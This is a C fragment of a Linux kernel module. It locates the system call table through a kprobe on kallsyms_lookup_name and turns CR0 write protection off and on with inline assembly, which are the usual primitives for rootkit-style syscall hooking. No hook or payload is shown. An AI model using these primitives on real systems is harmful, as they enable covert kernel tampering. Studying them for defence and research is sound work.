

uint64_t *get_syscall_table(void);


static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

void cr0_write(unsigned long val){
    asm volatile("mov %0,%%cr0"
                 : "+r"(val)
                 :
                 : "memory");
}

inline unsigned long unprotect_memory(void){
    unsigned long cr0;
    unsigned long newcr0;

    cr0 = native_read_cr0();
    newcr0 = cr0 & ~(X86_CR0_WP);
    cr0_write(newcr0);
    return cr0;
}

inline void protect_memory(unsigned long cr0){
    cr0_write(cr0);
}

uint64_t *get_syscall_table(void){
	typedef void *(*kallsyms_t)(const char *);
	kallsyms_t lookup_name;	
	uint64_t *syscall_table;

	register_kprobe(&kp);

    lookup_name = (kallsyms_t) (kp.addr);

    syscall_table = lookup_name("sys_call_table");

	return syscall_table;
}
